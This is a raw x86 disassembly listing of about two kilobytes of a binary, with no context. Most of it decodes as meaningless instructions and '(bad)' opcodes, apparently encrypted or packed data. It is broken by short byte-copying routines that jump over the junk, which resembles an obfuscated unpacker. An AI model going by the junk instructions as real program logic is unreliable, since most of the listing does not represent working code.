  40d9b0:	int3   
  40d9b1:	inc    edi
  40d9b2:	popa   
  40d9b3:	adc    al,0x41
  40d9b5:	or     eax,0x3a9b4250
  40d9ba:	or     ecx,DWORD PTR [ebx*8-0x4bd8f999]
  40d9c1:	jno    0x40d95d
  40d9c3:	xchg   ecx,eax
  40d9c4:	les    ebx,FWORD PTR [edi+0x70c05cd7]
  40d9ca:	or     al,0x1a
  40d9cc:	loop   0x40d9b4
  40d9ce:	jecxz  0x40d9e5
  40d9d0:	push   esp
  40d9d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9d2:	leave  
  40d9d3:	xor    eax,DWORD PTR [edi+ebp*2+0x68]
  40d9d7:	out    0xdb,eax
  40d9d9:	fistp  DWORD PTR [ebx-0x70]
  40d9dc:	mov    ds,WORD PTR [eax*1+0x6c36481f]
  40d9e3:	xchg   ebp,eax
  40d9e4:	pop    eax
  40d9e5:	adc    DWORD PTR [ebx+0x8],ebp
  40d9e8:	lock jge 0x40d9b5
  40d9eb:	jae    0x40d991
  40d9ed:	and    cx,cx
  40d9f0:	(bad)  
  40d9f1:	loope  0x40d9d7
  40d9f3:	or     eax,0x91694c62
  40d9f8:	cwde   
  40d9f9:	mov    bh,0x9a
  40d9fb:	xchg   DWORD PTR [ebp+ebp*8-0x51],edi
  40d9ff:	add    dl,0xc6
  40da02:	ret    
  40da03:	mov    eax,ds:0xe1db2ad7
  40da08:	xor    esp,DWORD PTR [edx-0x54524b83]
  40da0e:	jmp    0x2619:0xff7c7f8c
  40da15:	mov    ebx,0x1fa6d2cf
  40da1a:	(bad)  
  40da1b:	popf   
  40da1c:	fadd   DWORD PTR [edi-0x5f]
  40da1f:	mov    eax,ds:0x43da4ef4
  40da24:	mov    esi,0x6f7b3740
  40da29:	dec    esp
  40da2a:	add    dh,BYTE PTR [ebx]
  40da2c:	xor    dl,BYTE PTR [ecx]
  40da2e:	pusha  
  40da2f:	cmp    eax,0x449c4ed4
  40da34:	ret    0x108f
  40da37:	and    DWORD PTR ds:0xc2c0ec62,0xfffffff0
  40da3e:	mov    dh,0x14
  40da40:	pop    ds
  40da41:	jg     0x40d9c6
  40da43:	push   edi
  40da44:	imul   ebp,DWORD PTR [ebx],0x97ed8d1e
  40da4a:	faddp  st(6),st
  40da4c:	xchg   edi,eax
  40da4d:	leave  
  40da4e:	data16 and BYTE PTR [edi+0x32],al
  40da52:	mov    edi,0x6c9f597c
  40da57:	mov    edx,0x9d889cf2
  40da5c:	dec    BYTE PTR [edi]
  40da5e:	jns    0x40da7f
  40da60:	add    al,0x6
  40da62:	mov    ds:0x5a731270,al
  40da67:	dec    edi
  40da68:	repz xor BYTE PTR [ebx-0x52],ah
  40da6c:	jge    0x40da55
  40da6e:	mov    bh,BYTE PTR [ecx+0x4aaf8fc7]
  40da74:	fsubr  QWORD PTR [esi]
  40da76:	jno    0x40daac
  40da78:	pop    ds
  40da79:	fisubr DWORD PTR [ecx]
  40da7b:	mov    DWORD PTR [esi],0x8dd84fcb
  40da81:	mov    ebp,0xd8457e01
  40da86:	push   0x251d58c9
  40da8b:	pushf  
  40da8c:	test   eax,edx
  40da8e:	(bad)  
  40da8f:	jno    0x40dab8
  40da91:	cmp    BYTE PTR [ebx],dl
  40da93:	adc    al,0x7f
  40da95:	pushf  
  40da96:	pop    ebp
  40da97:	sub    DWORD PTR [ebp+0x51],edi
  40da9a:	or     esp,0x13ed7523
  40daa0:	cwde   
  40daa1:	and    ecx,DWORD PTR [ecx]
  40daa3:	adc    eax,0xdb1533ec
  40daa8:	in     eax,0x91
  40daaa:	xchg   esp,eax
  40daab:	dec    edi
  40daac:	sbb    edx,DWORD PTR [edx]
  40daae:	dec    esi
  40daaf:	mov    eax,ds:0x95c6efad
  40dab4:	pop    esp
  40dab5:	addr16 sahf 
  40dab7:	dec    edx
  40dab8:	(bad)  
  40dab9:	add    al,0x7a
  40dabb:	les    esi,FWORD PTR [eax+0x15]
  40dabe:	or     dh,al
  40dac0:	mov    edx,0x2c708f43
  40dac5:	cmp    esi,DWORD PTR [ebx-0x6695dd24]
  40dacb:	es mov eax,0x5c76f023
  40dad1:	mov    ah,0xc3
  40dad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad4:	inc    ecx
  40dad5:	mov    cl,0x77
  40dad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad8:	jmp    0x40da95
  40dada:	sub    DWORD PTR [eax-0x54b2291b],esi
  40dae0:	mov    bh,0xf9
  40dae2:	dec    ebp
  40dae3:	es push 0x51
  40dae6:	sbb    eax,0xfcab4d16
  40daeb:	add    al,0xae
  40daed:	ret    
  40daee:	call   0xb7f6:0x1ad29c9
  40daf5:	fst    QWORD PTR [esi]
  40daf7:	dec    eax
  40daf8:	and    eax,0xa8a3c6b6
  40dafd:	das    
  40dafe:	(bad)  
  40daff:	mov    ebp,DWORD PTR [edi]
  40db01:	test   DWORD PTR [edx+0x6c],esi
  40db04:	rcr    DWORD PTR [esi+0x57],0x73
  40db08:	test   eax,0x85f3c008
  40db0d:	call   0xa283:0x346c803c
  40db14:	hlt    
  40db15:	mov    ds:0xcf3c154d,al
  40db1a:	dec    ebp
  40db1b:	aas    
  40db1c:	in     al,dx
  40db1d:	icebp  
  40db1e:	fs aas 
  40db20:	in     al,0x97
  40db22:	repz mov ecx,DWORD PTR [edi]
  40db25:	mov    ebp,0xadf24790
  40db2a:	lock in eax,0xf1
  40db2d:	jne    0x40db58
  40db2f:	pop    ds
  40db30:	popf   
  40db31:	pop    esi
  40db32:	jp     0x40dad2
  40db34:	add    ebx,ebx
  40db36:	lds    esi,FWORD PTR [ebx+0x68389275]
  40db3c:	ret    
  40db3d:	cmc    
  40db3e:	add    al,0xe2
  40db40:	iret   
  40db41:	and    eax,0x458baf04
  40db46:	or     BYTE PTR [ecx-0x37],ch
  40db49:	add    DWORD PTR [esi],ebp
  40db4b:	add    BYTE PTR [eax],al
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db40
  40db97:	xor    al,0x21
  40db99:	jle    0x40dbf6
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [edi+0x6d],bh
  40dba4:	neg    DWORD PTR cs:[edx-0x2a8eacc1]
  40dbab:	hlt    
  40dbac:	pop    ds
  40dbad:	sbb    eax,DWORD PTR [edx+0x338eea8]
  40dbb3:	call   0x8fbe0c2b
  40dbb8:	gs lods al,BYTE PTR cs:[esi]
  40dbbb:	and    edi,esp
  40dbbd:	dec    ebp
  40dbbe:	loop   0x40dc15
  40dbc0:	dec    ebx
  40dbc1:	mov    ebp,0x1ff55767
  40dbc6:	push   es
  40dbc7:	enter  0x812b,0x92
  40dbcb:	mov    dl,BYTE PTR [esi+0x60fee8d0]
  40dbd1:	mov    bl,0xb7
  40dbd3:	aad    0xe1
  40dbd5:	sti    
  40dbd6:	mov    ecx,0xa80acf51
  40dbdb:	and    ah,BYTE PTR [ebx+0x4fbec401]
  40dbe1:	pop    esi
  40dbe2:	sbb    DWORD PTR [eax+esi*8-0x223bd5f],edi
  40dbe9:	add    ebx,esp
  40dbeb:	(bad)  
  40dbec:	fisubr WORD PTR [ecx-0x70]
  40dbef:	pop    ebp
  40dbf0:	push   ebx
  40dbf1:	dec    ebx
  40dbf2:	dec    ebp
  40dbf3:	dec    ecx
  40dbf4:	push   eax
  40dbf5:	push   ebp
  40dbf6:	xor    al,0x5a
  40dbf8:	push   edx
  40dbf9:	mov    esi,0xb2b2eeda
  40dbfe:	outs   dx,DWORD PTR ds:[esi]
  40dbff:	push   ebx
  40dc00:	and    BYTE PTR [ebx+ebx*2],bh
  40dc03:	mov    al,ds:0xa3edaf85
  40dc08:	and    eax,0xc07e31d5
  40dc0d:	xor    al,0xe2
  40dc0f:	sbb    eax,0xd3d297c1
  40dc14:	jbe    0x40dc4f
  40dc16:	xchg   esp,eax
  40dc17:	xchg   edx,eax
  40dc18:	sbb    eax,0xddcaaa3f
  40dc1d:	adc    al,0xaa
  40dc1f:	mov    ebx,0x6461a9ef
  40dc24:	inc    ecx
  40dc25:	xchg   ebx,eax
  40dc26:	jns    0x40dc11
  40dc28:	mul    DWORD PTR [edx-0x75e6fa74]
  40dc2e:	js     0x40dbc8
  40dc30:	je     0x40dc04
  40dc32:	or     eax,0x1c5ac589
  40dc37:	pop    edx
  40dc38:	test   BYTE PTR fs:[esp+ecx*4-0x2f],0xf0
  40dc3e:	add    al,0xd3
  40dc40:	sbb    eax,0x1c110009
  40dc45:	test   eax,0x2835b315
  40dc4a:	inc    esp
  40dc4b:	mov    al,ds:0xc770a4e
  40dc50:	mov    bl,0x33
  40dc52:	enter  0x84ef,0xae
  40dc56:	xor    DWORD PTR [ebp+0x70c2a853],ebx
  40dc5c:	push   edi
  40dc5d:	cmp    dl,BYTE PTR [edi]
  40dc5f:	mov    ah,0x10
  40dc61:	xchg   edx,eax
  40dc62:	test   eax,0x4a89ce3f
  40dc67:	imul   eax,edi,0x6abc0991
  40dc6d:	fisttp WORD PTR [eax+0x5d]
  40dc70:	jno    0x40dcc9
  40dc72:	xchg   BYTE PTR [edx+0x40],dl
  40dc75:	scas   eax,DWORD PTR es:[edi]
  40dc76:	mov    esp,0xa02535db
  40dc7b:	test   BYTE PTR [ebx-0x478fb9c1],ch
  40dc81:	push   ebp
  40dc82:	push   edi
  40dc83:	mov    edi,0x17af5acd
  40dc88:	call   0x9f27a8a4
  40dc8d:	arpl   WORD PTR [edi],ax
  40dc8f:	or     ecx,ebx
  40dc91:	fiadd  WORD PTR [esi-0x52]
  40dc94:	test   al,0x61
  40dc96:	scas   al,BYTE PTR es:[edi]
  40dc97:	stc    
  40dc98:	in     eax,dx
  40dc99:	jmp    0x40dcc1
  40dc9b:	push   ds
  40dc9c:	cmp    eax,0xeddd39e1
  40dca1:	adc    eax,DWORD PTR [eax-0x32]
  40dca4:	and    BYTE PTR [esi+0x7fbbdf2d],ch
  40dcaa:	xor    esp,0x23
  40dcad:	push   edx
  40dcae:	xor    BYTE PTR [edi-0x7],ah
  40dcb1:	mov    edi,0xd6bf761e
  40dcb6:	inc    edx
  40dcb7:	push   es
  40dcb8:	cmp    esi,DWORD PTR [esi]
  40dcba:	scas   eax,DWORD PTR es:[edi]
  40dcbb:	add    BYTE PTR [eax],ch
  40dcbd:	lahf   
  40dcbe:	js     0x40dcec
  40dcc0:	inc    ebp
  40dcc1:	sbb    al,0x60
  40dcc3:	cmp    al,BYTE PTR [edi]
  40dcc5:	pusha  
  40dcc6:	ins    DWORD PTR es:[edi],dx
  40dcc7:	xor    bl,BYTE PTR [ebx]
  40dcc9:	(bad)  
  40dcca:	loop   0x40dd25
  40dccc:	call   0x8d2bfe9d
  40dcd1:	sbb    bh,bl
  40dcd3:	lea    edi,[ecx-0x22d12044]
  40dcd9:	jecxz  0x40dcb0
  40dcdb:	clc    
  40dcdc:	fldcw  WORD PTR [edx-0x430107a8]
  40dce2:	div    DWORD PTR [eax-0x2fce645c]
  40dce8:	ret    
  40dce9:	hlt    
  40dcea:	xchg   esi,eax
  40dceb:	push   edi
  40dcec:	jecxz  0x40dc77
  40dcee:	add    edx,DWORD PTR [eax-0x50]
  40dcf1:	pop    ebx
  40dcf3:	sbb    DWORD PTR [ebx+0x2d6150c7],ecx
  40dcf9:	test   BYTE PTR [ebx+0x7b],ch
  40dcfc:	or     ebp,DWORD PTR es:[eax+edi*2]
  40dd00:	mov    esp,ebp
  40dd02:	popa   
  40dd03:	int    0x9d
  40dd05:	dec    edi
  40dd06:	push   edi
  40dd07:	jle    0x40dd1c
  40dd09:	or     BYTE PTR [edx-0x28054d40],0x6f
  40dd10:	push   es
  40dd11:	dec    edx
  40dd12:	pop    eax
  40dd13:	outs   dx,BYTE PTR ds:[esi]
  40dd14:	ret    
  40dd15:	mov    DWORD PTR ds:0xb00f22cb,ecx
  40dd1b:	mov    ebx,0x19275eea
  40dd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd21:	out    dx,eax
  40dd22:	xchg   sp,ax
  40dd24:	and    DWORD PTR [esi-0x2e0a9c92],ebx
  40dd2a:	hlt    
  40dd2b:	add    BYTE PTR [edx],dl
  40dd2d:	clc    
  40dd2e:	add    edi,DWORD PTR [esi+eax*4-0x170be381]
  40dd35:	call   0x50ff:0x895a4e8
  40dd3c:	dec    edx
  40dd3d:	and    BYTE PTR [ecx],dl
  40dd3f:	fsub   DWORD PTR ds:0x9ad539db
  40dd45:	mov    WORD PTR [ebx],ds
  40dd47:	(bad)  
  40dd48:	scas   al,BYTE PTR es:[edi]
  40dd49:	pop    esi
  40dd4a:	mov    edx,0x733c9281
  40dd4f:	ja     0x40ddc0
  40dd51:	inc    ebp
  40dd52:	jecxz  0x40dd93
  40dd54:	sbb    BYTE PTR [eax],ah
  40dd56:	ins    BYTE PTR es:[edi],dx
  40dd57:	cmc    
  40dd58:	ds iret 
  40dd5a:	lds    edx,FWORD PTR [edi+0x59]
  40dd5d:	cmp    eax,0xd10390ed
  40dd62:	aad    0x9e
  40dd64:	in     eax,0x4a
  40dd66:	mov    ah,0x3b
  40dd68:	mov    dh,0x7a
  40dd6a:	ret    
  40dd6b:	std    
  40dd6c:	imul   eax,eax,0x11192b03
  40dd72:	or     DWORD PTR [ebp-0x66],edx
  40dd75:	jnp    0x40dd72
  40dd77:	mov    ah,0xfb
  40dd79:	scas   eax,DWORD PTR es:[edi]
  40dd7a:	in     al,0x9a
  40dd7c:	xchg   BYTE PTR [ecx],dh
  40dd7e:	popf   
  40dd7f:	sahf   
  40dd80:	pushf  
  40dd81:	and    eax,0xc450ee02
  40dd86:	cmc    
  40dd87:	cmp    edi,ecx
  40dd89:	mov    bl,0xa7
  40dd8b:	xlat   BYTE PTR ds:[ebx]
  40dd8c:	cli    
  40dd8d:	xlat   BYTE PTR ds:[ebx]
  40dd8e:	(bad)  
  40dd8f:	sbb    edi,DWORD PTR [eax]
  40dd91:	and    dh,BYTE PTR [edi+0x38]
  40dd94:	dec    ebx
  40dd95:	mov    ds:0xbb0b3cd3,eax
  40dd9a:	dec    edx
  40dd9b:	jmp    0x26595c42
  40dda0:	(bad)  [ecx+0x4f]
  40dda3:	jge    0x40de15
  40dda5:	jb     0x40dd4d
  40dda7:	jecxz  0x40dd5e
  40dda9:	pop    edx
  40ddaa:	xor    DWORD PTR [esi+0x36e56428],0xffffff99
  40ddb1:	mov    fs,esi
  40ddb3:	add    BYTE PTR [ebx+0x2d],bh
  40ddb6:	mov    esp,0xf5a14c4e
  40ddbb:	cmp    eax,0x557dc2c9
  40ddc0:	push   es
  40ddc1:	leave  
  40ddc2:	jo     0x40ddeb
  40ddc4:	and    al,0xd1
  40ddc6:	das    
  40ddc7:	push   edx
  40ddc8:	rol    BYTE PTR [ebx],0x35
  40ddcb:	push   ebp
  40ddcc:	call   0x4e1295d
  40ddd1:	fptan  
  40ddd3:	pushf  
  40ddd4:	loopne 0x40dd9a
  40ddd6:	sub    BYTE PTR ds:0xc3b5cc42,dl
  40dddc:	retf   0x906f
  40dddf:	mov    DWORD PTR [edx],eax
  40dde1:	cmp    al,0x30
  40dde3:	jecxz  0x40dd7d
  40dde5:	push   ds
  40dde6:	and    ah,BYTE PTR ss:[eax+ebp*2]
  40ddea:	dec    ebx
  40ddeb:	repnz adc DWORD PTR [edi+0x28],0xffffffee
  40ddf0:	mov    bp,0x6eb3
  40ddf4:	cmc    
  40ddf5:	gs push cs
  40ddf7:	cmp    ah,bh
  40ddf9:	imul   ebp,DWORD PTR [esi+0x3a2a4439],0x9d4d67f
  40de03:	pop    ebx
  40de04:	mov    ch,0x84
  40de06:	mov    ds:0x9c1ff8ec,al
  40de0b:	fiadd  DWORD PTR [esi+0x494a21d8]
  40de11:	xlat   BYTE PTR ds:[ebx]
  40de12:	ins    DWORD PTR es:[edi],dx
  40de13:	fincstp 
  40de15:	stos   BYTE PTR es:[edi],al
  40de16:	jbe    0x40de72
  40de18:	dec    ebx
  40de19:	pop    eax
  40de1a:	popa   
  40de1b:	and    bh,al
  40de1d:	add    eax,0xa3566684
  40de22:	push   edx
  40de23:	pop    es
  40de24:	js     0x40ddbc
  40de26:	add    dl,BYTE PTR [ebx+0x7fe09e6e]
  40de2c:	test   al,0xb1
  40de2e:	mov    dh,0x7e
  40de30:	gs jnp 0x40de33
  40de33:	mov    ebx,fs
  40de35:	dec    edi
  40de36:	xchg   esi,eax
  40de37:	mov    ds:0x2d1e9be6,al
  40de3c:	and    DWORD PTR [esi-0xd112e0e],0xffffffc6
  40de43:	pop    edx
  40de44:	dec    esp
  40de45:	or     DWORD PTR [esi+0x45c74aa1],ebx
  40de4b:	fdivr  QWORD PTR [edx]
  40de4d:	cmp    al,BYTE PTR [eax]
  40de4f:	add    bh,al
  40de51:	inc    ebp
  40de52:	in     al,dx
  40de53:	int    0x13
  40de55:	add    BYTE PTR [eax],al
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422558
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40de94
  40deca:	sub    al,cl
  40decc:	mov    al,0x14
  40dece:	int3   
  40decf:	sbb    BYTE PTR [eax],bl
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [ecx-0x65ce5167],bh
  40deda:	mov    ds:0x3b2ad84,eax
  40dedf:	push   0x9e18ec0c
  40dee4:	inc    eax
  40dee5:	mov    dl,0x29
  40dee7:	jecxz  0x40df4a
  40dee9:	push   edx
  40deea:	dec    edx
  40deeb:	call   0x54929f91
  40def0:	out    dx,eax
  40def1:	or     DWORD PTR [eax+0xb833a40],edi
  40def7:	data16 mov BYTE PTR [esi],cl
  40defa:	adc    eax,0x95be1747
  40deff:	and    DWORD PTR [edi-0x46],ecx
  40df02:	push   ds
  40df03:	rol    ah,0x76
  40df06:	mov    al,0xf1
  40df08:	jae    0x40deb0
  40df0a:	and    eax,0x767f38e4
  40df0f:	inc    esp
  40df10:	sub    ch,BYTE PTR [eax+0x3eeb0376]
  40df16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df17:	out    dx,eax
  40df18:	inc    ebp
  40df19:	push   0x21f12c71
  40df1e:	xchg   ebx,eax
  40df1f:	in     al,dx
  40df20:	sub    eax,0xa67c5d25
  40df25:	aam    0xe6
  40df27:	imul   ebp
  40df29:	sbb    al,0xdb
  40df2b:	mov    esp,DWORD PTR [esi+ebx*1+0x7c781e75]
  40df32:	mov    ss,edx
  40df34:	fnstcw WORD PTR fs:[esi-0x14107d3b]
  40df3b:	xchg   BYTE PTR [eax+0x66ec5e4e],bh
  40df41:	dec    esi
  40df42:	xchg   DWORD PTR [ebx+0x6b6b29fa],ebp
  40df48:	jmp    0x63a8:0x72f35af7
  40df4f:	push   ebx
  40df50:	arpl   WORD PTR [edx-0x69],sp
  40df53:	mov    bh,0x54
  40df55:	push   ds
  40df56:	sbb    al,0x5a
  40df58:	xchg   bh,cl
  40df5a:	fldcw  WORD PTR [ebx-0x74]
  40df5d:	push   es
  40df5e:	and    edx,esp
  40df60:	and    BYTE PTR [edx-0xcba7bc4],0xaa
  40df67:	imul   ebp,DWORD PTR [esi-0x57],0xffffff87
  40df6b:	fadd   st(7),st
  40df6d:	sub    DWORD PTR [ebx+0x44],edx
  40df70:	adc    bh,BYTE PTR [eax-0x4fb03637]
  40df76:	sub    bl,BYTE PTR [esi]
  40df78:	jnp    0x40df4e
  40df7a:	int3   
  40df7b:	(bad)  
  40df7d:	fdiv   st,st(3)
  40df7f:	cmp    DWORD PTR [ecx+0x1443229b],edx
  40df85:	shl    DWORD PTR [ebx-0x1e],cl
  40df88:	mov    ah,0xd2
  40df8a:	sbb    bl,0x4e
  40df8d:	int3   
  40df8e:	xchg   esi,ebx
  40df90:	mov    edx,0xf2cbc2ee
  40df95:	pop    ecx
  40df96:	aaa    
  40df97:	mov    dh,0xf5
  40df99:	(bad)  
  40df9b:	inc    ebp
  40df9c:	imul   esp,edx,0xffffffc6
  40df9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfa0:	mov    edx,0xaadc16cd
  40dfa5:	sub    BYTE PTR ds:0xee2d55bf,bl
  40dfab:	out    dx,al
  40dfac:	frstor ds:0x2def08b2
  40dfb2:	cdq    
  40dfb3:	(bad)  
  40dfb4:	fcmovne st,st(1)
  40dfb6:	or     al,0xf9
  40dfb8:	mov    ah,0x22
  40dfba:	dec    ebp
  40dfbb:	into   
  40dfbc:	ret    0x139a
  40dfbf:	mov    dh,0x13
  40dfc1:	inc    eax
  40dfc2:	sbb    ah,0xa5
  40dfc5:	in     al,0x65
  40dfc7:	popf   
  40dfc8:	pop    ecx
  40dfc9:	sbb    eax,0xacefb1d6
  40dfce:	retf   0x3e13
  40dfd1:	out    dx,al
  40dfd2:	sub    DWORD PTR [ecx-0x53],0x1ccbaef9
  40dfd9:	(bad)  [esp+eiz*2+0x3d883720]
  40dfe0:	sub    BYTE PTR [ecx+esi*4+0x7c097aec],bh
  40dfe7:	xor    DWORD PTR [ebx+esi*4+0x28162004],eax
  40dfee:	mov    dl,0x37
  40dff0:	(bad)  
  40dff1:	aad    0x86
  40dff3:	stos   BYTE PTR es:[edi],al
  40dff4:	jl     0x40e058
  40dff6:	call   0x8fae8681
  40dffb:	(bad)  
  40dffc:	in     al,dx
  40dffd:	inc    ebx
  40dffe:	sahf   
  40dfff:	in     eax,dx
  40e000:	pop    esi
  40e001:	into   
  40e002:	test   dl,ch
  40e004:	jp     0x40e035
  40e006:	jmp    0x40dfee
  40e008:	cmp    eax,0x152a1eb
  40e00d:	adc    edi,ebp
  40e00f:	(bad)  
  40e010:	mov    esp,0x626be714
  40e015:	mov    eax,eax
  40e017:	retf   0xa26
  40e01a:	sbb    bl,BYTE PTR [ebp-0x46]
  40e01d:	jae    0x40dfd7
  40e01f:	pop    esp
  40e020:	pop    ss
  40e021:	(bad)  
  40e022:	loop   0x40e016
  40e024:	xchg   edx,eax
  40e025:	xchg   esi,eax
  40e026:	fist   WORD PTR [edi-0x561e293e]
  40e02c:	out    0x53,al
  40e02e:	or     BYTE PTR [eax],bl
  40e030:	mov    esi,0xa95a4b6c
  40e035:	bound  esi,QWORD PTR [edi]
  40e037:	data16 jp 0x40e031
  40e03a:	out    dx,eax
  40e03b:	mov    esi,0xd3c74431
  40e040:	inc    ebx
  40e041:	outs   dx,DWORD PTR ds:[esi]
  40e042:	scas   eax,DWORD PTR es:[edi]
  40e043:	mov    eax,ds:0xf0f54be0
  40e048:	retf   0xebed
  40e04b:	(bad)  
  40e04c:	jl     0x40e008
  40e04e:	push   eax
  40e04f:	je     0x40e0aa
  40e051:	fimul  DWORD PTR ds:0xa4d4f701
  40e057:	sbb    ecx,edi
  40e059:	xchg   ecx,eax
  40e05a:	xor    DWORD PTR [edx+edi*4+0x5ba6d7],esi
  40e061:	repz mov eax,0x9479c527
  40e067:	test   eax,0x5ead8dc5
  40e06c:	and    al,0x82
  40e06e:	mov    ds:0x2d8e1585,eax
  40e073:	push   cs
  40e074:	loop   0x40e06b
  40e076:	or     edi,DWORD PTR [eax-0x4e]
  40e079:	jae    0x40e0d6
  40e07b:	(bad)  
  40e07c:	mov    ebp,0xed02ab93
  40e081:	outs   dx,DWORD PTR ds:[esi]
  40e082:	test   eax,0x29e9e290
  40e087:	mov    ebx,0x1bebf138
  40e08c:	cmp    edi,DWORD PTR [esi+0x3f726bc]
  40e092:	addr16 leave 
  40e094:	inc    esi
  40e095:	or     al,0xea
  40e097:	fdivr  DWORD PTR [eax+0x4e174d1d]
  40e09d:	cmp    esi,DWORD PTR [eax+0x208f843d]
  40e0a3:	dec    eax
  40e0a4:	aad    0xb7
  40e0a6:	push   ds
  40e0a7:	inc    esp
  40e0a8:	iret   
  40e0a9:	or     DWORD PTR [esi-0x23e5d96f],esp
  40e0af:	and    DWORD PTR [ebp+0x2d],edx
  40e0b2:	shr    BYTE PTR [edi+0x585b7da9],1
  40e0b8:	mov    edi,0xaae8591c
  40e0bd:	(bad)  
  40e0be:	adc    cl,BYTE PTR [edx-0x1ba1a11d]
  40e0c4:	popa   
  40e0c5:	mov    ah,0x1
  40e0c7:	mov    esp,0x7c9a4ce7
  40e0cc:	push   ebx
  40e0cd:	inc    eax
  40e0ce:	mov    ch,0x82
  40e0d0:	jecxz  0x40e076
  40e0d2:	jb     0x40e0b9
  40e0d4:	sahf   
  40e0d5:	shr    DWORD PTR [edx+0xe25d863],0x2
  40e0dc:	pop    ecx
  40e0dd:	or     DWORD PTR [ebx],ecx
  40e0df:	dec    ecx
  40e0e0:	add    edi,DWORD PTR [ebp+0x292ade55]
  40e0e6:	or     bh,BYTE PTR [ebp-0x2a]
  40e0e9:	mov    esp,0xb291cb44
  40e0ee:	inc    ebx
  40e0ef:	push   ss
  40e0f0:	mov    ds:0x6ba1519,al
  40e0f6:	xor    eax,0xa0f644fb
  40e0fb:	mov    ebx,0x68aaf15d
  40e100:	cwde   
  40e101:	mov    ebx,0xaf18b53d
  40e106:	jae    0x40e11a
  40e108:	xchg   edx,eax
  40e109:	outs   dx,BYTE PTR ds:[esi]
  40e10a:	adc    edx,DWORD PTR [ebx]
  40e10c:	mov    fs,WORD PTR [ebx+esi*2+0x754e735f]
  40e113:	imul   eax,DWORD PTR [ecx-0x4b],0x97a608c6
  40e11a:	rcr    bl,cl
  40e11c:	(bad)  
  40e11d:	loop   0x40e0eb
  40e11f:	push   eax
  40e120:	and    eax,0xa251c3cd
  40e125:	mov    edx,0xca658b52
  40e12a:	es pop eax
  40e12c:	pop    esp
  40e12d:	and    eax,DWORD PTR [edx+0x5fd7daa4]
  40e133:	out    dx,eax
  40e134:	xor    BYTE PTR [edi],al
  40e136:	sbb    edi,DWORD PTR [edi+0x4fece0]
  40e13c:	sbb    cl,cl
  40e13e:	pop    ds
  40e13f:	jno    0x40e16d
  40e141:	jl     0x40e0ca
  40e143:	cli    
  40e144:	push   edi
  40e145:	out    0x78,al
  40e147:	adc    al,0x54
  40e149:	fnsave [ebp+0x3f6ebb35]
  40e14f:	sbb    dh,ch
  40e151:	in     eax,0xe6
  40e153:	mov    ds:0x53f9cc99,eax
  40e158:	lods   eax,DWORD PTR ds:[esi]
  40e159:	sub    ah,BYTE PTR [ebx]
  40e15b:	xor    DWORD PTR [ecx-0x48],ebx
  40e15e:	xor    BYTE PTR [ebp-0x4b957daa],ch
  40e164:	les    edi,FWORD PTR ds:0xa9858fab
  40e16a:	imul   esp,ebp,0xa183e6f0
  40e170:	jg     0x40e1cb
  40e172:	(bad)  
  40e173:	xor    ch,ah
  40e175:	jl     0x40e1bb
  40e177:	in     eax,dx
  40e178:	jno    0x40e1a4
  40e17a:	sub    eax,0xf0458b9c
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1f2
  40e199:	(bad)  
  40e19b:	jle    0x40e16b
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [edi+0x19f93542],bh
  40e1a9:	push   0xfffffffd
  40e1ab:	cld    
  40e1ac:	mov    ecx,0xbfa5fdfc
  40e1b1:	sub    DWORD PTR [ebp+eiz*1+0x77],ebx
